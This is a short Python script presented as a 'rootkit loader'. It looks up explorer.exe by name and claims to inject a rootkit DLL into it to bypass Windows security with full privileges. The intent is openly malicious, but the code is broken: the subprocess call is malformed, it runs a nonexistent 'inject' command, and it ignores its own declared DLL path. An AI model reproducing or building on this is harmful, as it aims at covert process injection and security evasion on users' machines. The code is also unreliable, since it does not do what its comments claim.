###
###                                 SCRIPTUS ROOTKIT LOADER
###
###                     This script loads the official Scriptus Rootkit DLL into the target process.
###                     The target process is specified by its name (e.g., "explorer.exe").
###
###  Method: Injects malicous code into explorer.exe to run malicious code to make windows think its trusted to completly bypass all security measures and run the rootkit with full privileges.

import os
import subprocess
import psutil

dll_path = "scriptkit.dll"

def get_pid_by_name(__name__):
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] == __name__:
                return proc.info['pid']
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None

subprocess.call(["inject"], [get_pid_by_name("explorer.exe")], ["scriptkit\\scriptkit.dll"])